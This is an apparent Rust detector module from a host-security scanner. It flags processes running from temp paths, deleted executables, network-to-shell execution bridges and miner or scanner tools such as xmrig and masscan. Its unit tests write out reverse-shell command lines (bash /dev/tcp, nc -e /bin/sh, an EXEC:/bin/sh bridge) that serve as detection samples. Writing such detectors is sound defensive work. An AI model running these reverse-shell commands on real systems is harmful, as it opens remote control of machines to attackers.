use crate::detectors::command_profile::{
    network_execution_assessment_from_event, CommandAssessment,
};
use crate::detectors::{evidence, path_is_allowlisted, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};

pub struct ProcessDetector;

impl Detector for ProcessDetector {
    fn name(&self) -> &'static str {
        "process_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PROC-001",
                "Process running from temporary path",
                Category::Process,
                Severity::High,
                "A process executable path is under a suspicious temporary directory.",
            ),
            RuleMetadata::new(
                "PROC-002",
                "Deleted executable still running",
                Category::Process,
                Severity::High,
                "A process executable appears to be deleted while still running.",
            ),
            RuleMetadata::new(
                "PROC-003",
                "Network command execution bridge",
                Category::Process,
                Severity::Critical,
                "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
            ),
            RuleMetadata::new(
                "PROC-004",
                "Possible miner or scanner process",
                Category::Process,
                Severity::Critical,
                "A process command line contains common miner or scanner names.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for event in events
            .iter()
            .filter(|event| event.kind == "process_snapshot")
        {
            let exe_path = string_field(event, "exe_path");
            let cmdline = string_field(event, "cmdline");
            if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths)
                || command_matches_allowlist(
                    &cmdline,
                    &ctx.config.allowlist.process_command_contains,
                )
            {
                continue;
            }
            if exe_path.contains(" (deleted)") || exe_path.ends_with("deleted") {
                findings.push(deleted_executable(event, ctx));
            }
            if process_from_suspicious_dir(&exe_path, ctx) {
                findings.push(temp_process(event, ctx));
            }
            if network_execution_assessment_from_event(event).is_suspicious() {
                findings.push(network_execution_bridge(event, ctx));
            }
            if contains_miner_or_scanner(&cmdline) {
                findings.push(miner_or_scanner(event, ctx));
            }
        }
        findings
    }
}

fn temp_process(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let subject = string_field(event, "pid");
    Finding::new(
        &ctx.host_id,
        "Process executable in temporary path",
        "A running process executable is located in a path commonly abused for malware staging.",
        Severity::High,
        Category::Process,
        "PROC-001",
        subject,
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Inspect the executable hash, parent process, and file owner.".to_string(),
        "Preserve evidence before stopping or removing the process.".to_string(),
    ])
}

fn deleted_executable(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Deleted executable still running",
        "A process executable path indicates the backing file was deleted while the process remains active.",
        Severity::High,
        Category::Process,
        "PROC-002",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Capture process details and network connections before termination.".to_string(),
        "Review how the process was launched.".to_string(),
    ])
}

fn network_execution_bridge(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let assessment = network_execution_assessment_from_event(event);
    Finding::new(
        &ctx.host_id,
        "Network command execution bridge detected",
        "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
        Severity::Critical,
        Category::Process,
        "PROC-003",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence_with_assessment(event, &assessment))
    .with_impact(vec![
        "This may indicate active remote command execution when the process is not expected."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Isolate network access if the process is unauthorized.".to_string(),
        "Preserve command line, executable, and parent process evidence.".to_string(),
    ])
}

fn miner_or_scanner(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Possible miner or scanner process",
        "A process command line contains common miner or scanner indicators.",
        Severity::Critical,
        Category::Process,
        "PROC-004",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Check CPU/network usage and whether the binary was intentionally installed.".to_string(),
        "Rotate credentials if compromise is confirmed.".to_string(),
    ])
}

fn process_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
    vec![
        evidence("pid", string_field(event, "pid")),
        evidence("ppid", string_field(event, "ppid")),
        evidence("name", string_field(event, "name")),
        evidence("exe_path", string_field(event, "exe_path")),
        evidence("cmdline", string_field(event, "cmdline")),
    ]
}

fn process_evidence_with_assessment(
    event: &RawEvent,
    assessment: &CommandAssessment,
) -> Vec<sentinel_core::Evidence> {
    let mut items = process_evidence(event);
    items.push(evidence("risk_score", assessment.score.to_string()));
    items.push(evidence("risk_reasons", assessment.reason_text()));
    items.push(evidence("risk_features", assessment.feature_names()));
    items
}

fn process_from_suspicious_dir(path: &str, ctx: &DetectContext) -> bool {
    path_in_suspicious_dirs(path, &ctx.config.process.suspicious_dirs)
}

pub(crate) fn path_in_suspicious_dirs(path: &str, dirs: &[std::path::PathBuf]) -> bool {
    dirs.iter().any(|dir| {
        let prefix = dir.to_string_lossy().replace('\\', "/");
        path == prefix || path.starts_with(&format!("{prefix}/"))
    })
}

pub(crate) fn command_matches_allowlist(command: &str, allowlist: &[String]) -> bool {
    let command = command.trim();
    if command.is_empty() {
        return false;
    }
    allowlist
        .iter()
        .map(|item| item.trim())
        .filter(|item| !item.is_empty())
        .any(|item| command.contains(item))
}

pub(crate) fn contains_miner_or_scanner(command: &str) -> bool {
    command
        .split_whitespace()
        .map(command_token_basename)
        .any(|name| matches_known_tool_name(&name))
}

fn command_token_basename(token: &str) -> String {
    let trimmed = token.trim_matches(|ch: char| {
        ch.is_ascii_whitespace()
            || matches!(
                ch,
                '"' | '\'' | '`' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}'
            )
    });
    trimmed
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(trimmed)
        .to_ascii_lowercase()
}

fn matches_known_tool_name(name: &str) -> bool {
    const KNOWN_TOOL_NAMES: &[&str] = &["xmrig", "kinsing", "masscan", "zmap"];
    let normalized = name.strip_suffix(".exe").unwrap_or(name);
    KNOWN_TOOL_NAMES.contains(&normalized)
}

#[cfg(test)]
mod tests {
    use super::{command_matches_allowlist, contains_miner_or_scanner};
    use crate::detectors::command_profile::assess_network_execution_command;

    #[test]
    fn process_patterns_match_known_bad_fragments() {
        assert!(
            assess_network_execution_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
                .is_suspicious()
        );
        assert!(
            assess_network_execution_command("nc -e /bin/sh 203.0.113.10 4444").is_suspicious()
        );
        assert!(
            assess_network_execution_command("tool TCP:203.0.113.10:4444 EXEC:/bin/sh")
                .is_suspicious()
        );
        assert!(contains_miner_or_scanner("/tmp/xmrig -o pool"));
        assert!(contains_miner_or_scanner("/opt/tools/masscan --rate 1000"));
        assert!(contains_miner_or_scanner("C:\\temp\\zmap.exe -p 22"));
        assert!(!contains_miner_or_scanner("/usr/bin/sshd"));
        assert!(!contains_miner_or_scanner("/opt/company/xmrigate --worker"));
    }

    #[test]
    fn process_patterns_ignore_plain_traffic_forwarding() {
        assert!(!assess_network_execution_command(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("gost -L=tcp://:8443 -F=tcp://example.com:443")
                .is_suspicious()
        );
        assert!(!assess_network_execution_command(
            "forwarder tcp-listen:8443 tcp:198.51.100.10:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("ssh -N -L 127.0.0.1:8080:10.0.0.1:80 bastion")
                .is_suspicious()
        );
    }

    #[test]
    fn process_command_allowlist_matches_configured_fragments() {
        let allowlist = vec!["TCP4-LISTEN:8848".to_string()];
        assert!(command_matches_allowlist(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443",
            &allowlist
        ));
        assert!(!command_matches_allowlist("/usr/bin/sshd", &allowlist));
    }
}
